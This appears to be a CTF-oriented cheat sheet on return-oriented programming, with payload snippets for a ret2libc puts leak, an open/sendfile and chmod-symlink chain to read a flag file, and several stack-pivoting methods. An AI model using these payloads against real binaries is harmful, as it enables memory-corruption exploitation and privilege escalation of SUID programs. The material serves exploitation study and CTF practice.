---
layout: wrapper
title: ROP Techniques
---

### Symbolic link abuse, with `chmod` syscall
Finding offsets of existing strings in a binary:

```bash
strings -a -t x vuln
```

Choose the desired string, eg `"puts"`, then create a symbolic link to the flag:

```bash
ln -s /flag puts
```

Create a ROP-chain that calls `chmod("puts", 4)`:

```
rax 90
rdi ptr
rsi 4
```

### libc's `open` then `sendfile`

```
    open  sendfile
rdi ptr   1
rsi 0     fd
rdx -     0
rcx -     1000
```

- The `fd` could be guessed, even if it is not leaked. If the flag is the first file that is opened, chances are the allocated `fd` is `3`.

In a `sendfile` syscall, the fourth argument should be in `r10`. However, the libc wrapper has an instruction at the beginning that moves the value in `rcx` to `r10`.

### ret2libc: calculating libc base from `puts(puts)` leak
```python
payload = flat(
    pad * b"A",
    pop_rdi_ret,
    elf.got["puts"],
    elf.plt["puts"],
    elf.sym["main"]
)
p.sendline(payload)
libc.address = int.from_bytes(p.recv(6), "little") - libc.sym["puts"]
```

Though a common goal is to invoke `system("/bin/sh")`, `chmod()` could also be used if the context is privilege escalation of a SUID binary while already having a shell.

### Stack pivoting high-level idea
`leave` is actually an abstraction of `mov rsp, rbp; pop rbp`. If `rbp` can be controlled, then `rsp` can be made to point to anywhere.

This is especially useful if, for example, there are two writable regions:
1. the first is large and is able to contain the entire gadget chain, but has no BOF
2. the second is small, but has BOF

```assembly
leave => mov rsp, rbp
         pop rbp
ret      pop rip
```

### Stack pivoting with `pop rbp; ret`
```python
payload = flat(
    pad * b"A",
    pop_rbp_ret,
    target_addr,
    leave_ret
)
```

- Remember to account for the internal `pop rbp` in `leave` when setting the target address.

A given region may be writable, but not stable. Check for stable regions to place gadgets by sending an intial payload of junk bytes (eg `b"A"`). Regions which remain as `0x41` are stable.

### Stack pivoting with `leave; ret`
Notice that `pop rbp` is an internal instruction in `leave`. This can be used in place of a `pop rbp; ret` if there is no such gadget, or if there are PIE constraints.

```python
payload = flat(
    pad * b"A",       # -8 from the standard cyclic
    target_addr,      # to be popped into RBP during the first leave
    leave_ret_nibbles # comes down to luck if the address matches PIE
)
```

- `set $pc = 0x...` can be used to test PoC in GDB while avoiding randomness

### Stack pivoting with other gadgets
The following is a non-exhaustive list of possible pivot gadgets:
- `pop rsp; ret`
- `jmp <register>`
- `sub rsp <value>; ret`
- `xchg rsp <register>; ret`
